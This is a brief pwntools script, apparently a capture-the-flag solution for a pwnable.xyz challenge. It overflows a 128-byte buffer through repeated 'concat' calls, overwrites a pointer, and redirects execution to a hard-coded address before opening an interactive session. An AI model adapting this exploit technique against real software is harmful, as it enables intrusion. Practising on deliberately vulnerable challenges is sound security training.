from pwn import *

context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30013)
e = ELF("challenge")

def concat(data):
	s.sendlineafter("> ","1")
	s.recvuntil("Name: ")
	s.send(data)

s.recvuntil("Name: ")
s.send("\x00")
s.recvuntil("Desc: ")
s.sendline("AAAA")

for i in range(20):
	concat("\x00")

concat("A"*128+"\x20\x20\x60\x41")

s.sendlineafter("> ","2")
s.recvuntil("Desc: ")
s.send(p64(0x40094C))

s.interactive()
